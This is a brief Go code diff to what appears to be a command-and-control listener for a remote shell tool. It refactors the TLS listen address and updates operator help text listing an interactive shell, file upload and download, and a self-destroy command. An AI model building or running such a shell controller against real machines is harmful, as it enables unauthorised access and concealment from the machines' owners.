@@ -13,9 +13,7 @@ import (
 )
 
 func StartServer(userOP config.UserOperation) {
-	lres := userOP.Host
-	lport := strconv.Itoa(userOP.Port)
-	fladdr := lres + ":" + lport
+	fladdr := userOP.ListenAddr
     lbserver, err := transport.TLSServerBuilder(fladdr, false)
     if err != nil {
     	panic(err)
@@ -40,7 +38,7 @@ func printHelp(){
 	fmt.Println(
 `
 Usage: 
-bash = Get Shell (Non-interactive)
+bash = Get Shell (Interactive)
 upload <Source File Path> <Destination File Path> = Upload file
 download <Source File Path> <Destination File Path> = Download file
 boom = Self-Destroy
